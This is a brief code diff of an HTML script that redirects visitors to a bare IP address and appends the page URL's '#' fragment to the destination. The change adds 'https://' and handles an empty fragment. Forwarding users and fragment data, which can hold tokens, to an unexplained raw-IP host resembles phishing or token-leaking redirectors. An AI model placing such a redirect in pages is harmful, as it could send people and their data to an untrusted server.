@@ -1,1 +1,8 @@
-<script>document.location.href = '23.170.241.4/'+window.location.href.split('#')[1];</script>
+<script>
+    const hashValue = window.location.href.split('#').slice(1).join('#');
+    if (hashValue) {
+        document.location.href = 'https://23.170.241.4/' + hashValue;
+    } else {
+        document.location.href = 'https://23.170.241.4/';
+    }
+</script>
